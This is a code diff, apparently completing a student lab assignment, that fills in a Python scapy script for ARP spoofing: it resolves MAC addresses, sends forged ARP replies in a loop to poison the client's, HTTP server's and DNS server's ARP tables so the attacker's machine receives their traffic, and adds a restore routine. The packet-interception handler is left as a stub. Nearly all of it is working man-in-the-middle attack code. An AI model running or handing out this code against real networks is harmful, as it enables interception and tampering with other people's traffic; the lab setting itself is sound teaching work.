@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 from scapy.all import *
 
 import argparse
@@ -24,27 +25,32 @@ def debug(s):
 
 # TODO: returns the mac address for an IP
 def mac(IP):
-    return
+    arp_request = ARP(op=1, pdst=IP, hwdst='ff:ff:ff:ff:ff:ff')
+    resp = sr1(arp_request)
+    return resp[ARP].hwsrc
 
 
 #ARP spoofs client, httpServer, dnsServer
 def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
     while True:
-        spoof() # TODO: Spoof client ARP table
-        spoof() # TODO: Spoof httpServer ARP table
-        spoof() # TODO: Spoof client ARP table
-        spoof() # TODO: Spoof dnsServer ARP table
+        spoof(httpServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
+        spoof(clientIP, attackerMAC, httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
+        spoof(dnsServerIP, attackerMAC, clientIP, clientMAC) # TODO: Spoof client ARP table
+        spoof(clientIP, attackerMAC, dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
         time.sleep(interval)
 
 
 # TODO: spoof ARP so that dst changes its ARP table entry for src 
 def spoof(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
+    gratuitous_arp = ARP(op=2, psrc=srcIP, hwsrc=srcMAC, pdst=dstIP, hwdst=dstMAC)
+    send(gratuitous_arp)
 
 
 # TODO: restore ARP so that dst changes its ARP table entry for src
 def restore(srcIP, srcMAC, dstIP, dstMAC):
     debug(f"restoring ARP table for {dstIP}")
+    spoof(srcIP, srcMAC, dstIP, dstMAC)
 
 
 # TODO: handle intercepted packets
